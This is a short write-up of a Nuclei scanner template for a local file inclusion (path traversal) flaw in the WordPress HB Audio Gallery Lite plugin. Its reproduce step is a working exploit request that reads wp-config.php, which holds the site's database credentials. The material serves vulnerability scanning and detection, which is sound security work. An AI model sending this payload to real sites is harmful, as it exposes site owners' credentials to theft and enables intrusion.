# Nuclei Template: Wordpress HB Audio Gallery Lite - Local File Inclusion
**Template ID:** hb-audio-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`hb-audio-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Wordpress HB Audio Gallery Lite is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10
```

## References
- https://packetstormsecurity.com/files/136340/WordPress-HB-Audio-Gallery-Lite-1.0.0-Arbitrary-File-Download.html
